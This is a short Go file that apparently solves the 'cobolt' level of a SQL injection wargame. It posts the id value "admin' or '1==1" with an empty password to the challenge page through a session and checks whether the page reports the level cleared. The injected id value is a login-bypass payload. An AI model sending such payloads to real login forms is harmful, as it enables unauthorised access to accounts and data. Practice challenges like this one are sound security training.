package problem

import(
	"fmt"
	"strings"
)

func Cobolt(session string){
	file := "cobolt_c1c72102d0334847a38123e460f27f8c.php"
	param := map[string]string{
		"id" : "admin' or '1==1",
		"pw" : "",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"COBOLT Clear!"){
		fmt.Println("COBOLT Clear!")
	}
}